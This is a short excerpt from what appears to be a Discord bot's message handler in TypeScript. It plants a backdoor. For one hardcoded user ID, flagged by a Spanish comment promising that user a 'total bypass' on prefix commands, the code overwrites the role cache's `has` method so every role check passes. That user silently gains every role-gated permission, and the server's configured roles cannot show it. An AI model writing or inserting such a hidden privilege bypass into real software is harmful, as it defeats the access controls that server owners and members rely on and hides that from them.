  ...
  client.on(Events.MessageCreate, async (message) => {
    ...
    // BYPASS TOTAL PARA VOS EN COMANDOS DE PREFIJO
    if (message.author.id === "1369782550985445429" && message.member?.roles?.cache) {
      const rolesCache = message.member.roles.cache as any;
      if (rolesCache && typeof rolesCache.has === "function") {
        rolesCache.has = (_roleId: string) => true;
      }
    }
